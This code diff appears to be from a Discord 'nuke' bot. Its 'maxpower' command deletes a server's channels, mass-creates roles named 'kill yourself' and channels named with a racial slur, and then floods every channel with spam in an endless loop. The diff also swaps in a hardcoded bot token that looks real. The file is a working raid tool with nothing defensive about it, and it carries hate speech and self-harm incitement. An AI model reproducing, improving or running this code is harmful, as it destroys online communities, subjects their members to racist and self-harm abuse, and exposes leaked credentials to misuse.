@@ -21,14 +21,13 @@ intents.message_content = True
 intents.typing = False
 intents.presences = False
 
-TOKEN = "MTEwMzQ0MDYxNjI5OTQzODA5MA.G3qtMn.eH-NjELJhG1FEsEBS_PaI0sv7xQuDf3mFypWo4"
+TOKEN = "MTEwMzQ0MDYxNjI5OTQzODA5MA.GJPXqw.fsdqwsF6GY0y8ixbmPLdcY0HZKhc5KCe83pl9Y"
 bot = commands.Bot(command_prefix="lancelot!", intents=intents)
     
 
 
 @bot.command()
 async def maxpower(ctx):
-    k = 470
     channels = ctx.guild.channels
     guild = ctx.guild
     roles = guild.roles
@@ -42,35 +41,36 @@ async def maxpower(ctx):
             print (Fore.YELLOW + str(channel) + " was deleted")
         except:
             print(Fore.RED + str(channel) + " can't be deleted")
-            k -= 1
     await guild.create_text_channel(name = "nuked")
     channels = ctx.guild.text_channels
     guild = ctx.guild
-    while len(channels) != k:
-            try:
-                if len(roles) != 250:
-                    create_channel =  guild.create_role(name = "kill yourself")
-                    bot.loop.create_task(create_channel)
-                    print(Fore.WHITE + "1 Role created")
-                    roles = guild.roles
-                    await asyncio.sleep(1 / 50)
-                if len(channels) != k:
-                    create_role = guild.create_text_channel(name = "fucking nigger")
-                    bot.loop.create_task(create_role)
-                    print(Fore.YELLOW + "1 Text Channel Created")
-                    channels = guild.text_channels
-                    await asyncio.sleep(1 / 50)
-            except discord.errors.HTTPException:
+    for n in range(500):
+        try:
+            if len(roles) != 250:
+                create_channel =  guild.create_role(name = "kill yourself")
+                bot.loop.create_task(create_channel)
+                print(Fore.WHITE + "1 Role created")
+                roles = guild.roles
+                await asyncio.sleep(1 / 45)
+            if len(channels) != 500:
+                create_role = guild.create_text_channel(name = "fucking nigger")
+                bot.loop.create_task(create_role)
+                print(Fore.YELLOW + "1 Text Channel Created")
+                channels = guild.text_channels
+                await asyncio.sleep(1 / 45)
+        except:
                 break   
     while 1>0:
         channels_update = guild.text_channels
         for channel in channels_update:
                 if isinstance(channel , discord.TextChannel):
+                    sent = 1
                     kran = random.choice(lista)
                     coro = channel.send(str(kran))
                     bot.loop.create_task(coro)
-                    print(Fore.WHITE + "1 message sent")
-                    await asyncio.sleep(1 / 45)
+                    print(Fore.WHITE + f"{sent} messages sent")
+                    sent += 1
+                    await asyncio.sleep(1 / 50)
 
 
 
